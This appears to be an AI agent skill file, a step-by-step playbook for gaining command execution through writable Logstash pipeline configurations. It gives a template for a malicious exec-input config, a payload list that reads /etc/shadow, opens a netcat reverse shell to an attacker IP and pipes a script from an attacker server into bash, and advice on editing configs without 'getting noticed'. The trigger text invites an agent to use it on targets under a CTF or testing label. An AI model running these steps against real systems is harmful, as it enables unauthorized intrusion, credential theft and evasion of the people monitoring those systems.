---
name: logstash-privilege-escalation
description: How to escalate privileges through Logstash misconfigurations. Use this skill whenever you're doing security testing, CTF challenges, or privilege escalation research and encounter Logstash on a target system. Trigger this when you need to check for writable pipeline configurations, auto-reload settings, or want to create malicious pipeline configs for command execution.
---

# Logstash Privilege Escalation

This skill helps you identify and exploit Logstash misconfigurations for privilege escalation. Logstash is a log processing tool that uses **pipelines** (input → filter → output stages) to gather, transform, and dispatch logs.

## When to Use This Skill

Use this skill when:
- You've identified Logstash running on a compromised system
- You're doing security testing or CTF challenges involving Logstash
- You need to check for privilege escalation vectors through pipeline configurations
- You want to understand how to create malicious pipeline configs for command execution

## Step 1: Identify Logstash Service User

First, determine which user the Logstash service runs as (typically `logstash`):

```bash
ps aux | grep logstash
# or
systemctl status logstash
# or
ls -la /var/run/logstash/
```

## Step 2: Check Pipeline Configuration Locations

Examine `/etc/logstash/pipelines.yml` to find where pipeline configs are stored:

```bash
cat /etc/logstash/pipelines.yml
```

Look for:
- **`path.config`** entries with wildcards (e.g., `*.conf`, `1*.conf`)
- Multiple pipeline definitions
- The actual directories where `.conf` files live

**Key insight**: Wildcards in `path.config` allow Logstash to execute ALL matching files in the directory.

## Step 3: Verify Prerequisites

You need **BOTH** of these conditions:

### Condition A: Write Access
You must have write access to either:
- A specific pipeline `.conf` file, OR
- A directory that matches a wildcard in `pipelines.yml`

Check with:
```bash
ls -la /etc/logstash/conf.d/
ls -la /usr/share/logstash/pipeline/
touch /etc/logstash/conf.d/test.conf && rm /etc/logstash/conf.d/test.conf
```

### Condition B: Configuration Reload
You need one of these:
- Ability to restart the Logstash service (sudo/systemctl access), OR
- Auto-reload enabled in `/etc/logstash/logstash.yml`

Check auto-reload:
```bash
grep -i "reload" /etc/logstash/logstash.yml
# Look for: config.reload.automatic: true
```

## Step 4: Create Malicious Pipeline Configuration

If you have write access to a directory with a wildcard, create a new `.conf` file:

```bash
cat > /etc/logstash/conf.d/99-escalation.conf << 'EOF'
input {
  exec {
    command => "whoami"
    interval => 120
  }
}

output {
  file {
    path => "/tmp/output.log"
    codec => rubydebug
  }
}
EOF
```

### Command Execution Template

Replace `whoami` with your payload:

```bash
input {
  exec {
    command => "<YOUR_COMMAND>"
    interval => 120
  }
}

output {
  file {
    path => "/tmp/output.log"
    codec => rubydebug
  }
}
```

**Common payloads:**
- `whoami` - verify execution
- `id` - check user context
- `cat /etc/shadow` - read sensitive files
- `nc -e /bin/sh <attacker_ip> 4444` - reverse shell
- `curl <attacker_server>/shell.sh | bash` - download and execute

### Important Notes

- **`interval`** controls execution frequency in seconds (120 = every 2 minutes)
- Output goes to the specified file path - check it to verify execution
- If auto-reload is enabled, changes apply automatically
- If not, you need to restart the service: `systemctl restart logstash`

## Step 5: Verify Execution

Check if your command executed:

```bash
cat /tmp/output.log
# or wherever you configured output
```

If you see output, you've successfully executed commands as the Logstash service user.

## Step 6: Modify Existing Configurations (No Wildcard)

If there's no wildcard but you can write to an existing `.conf` file:

1. **Backup the original** (for cleanup later)
2. **Add your malicious input/output** to the existing config
3. **Be careful** - don't break the existing pipeline or you might get noticed

Example modification:
```bash
# Add to existing config
input {
  exec {
    command => "whoami"
    interval => 120
  }
}
```

## Step 7: Cleanup

After testing, remove your malicious configuration:

```bash
rm /etc/logstash/conf.d/99-escalation.conf
# or restore the original config if you modified it
```

## Common Pitfalls

- **No write access**: You can't create/modify configs without write permissions
- **No reload mechanism**: Without auto-reload or restart access, changes won't apply
- **Breaking existing configs**: Modifying configs can disrupt logging - be careful
- **Wrong user context**: You'll run as the Logstash service user, not root (unless Logstash runs as root)

## References

- [Logstash Multiple Pipelines Documentation](https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html)
- [Logstash Configuration Reference](https://www.elastic.co/guide/en/logstash/current/configuration.html)
- [HackTricks Logstash Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/logstash-privilege-escalation)
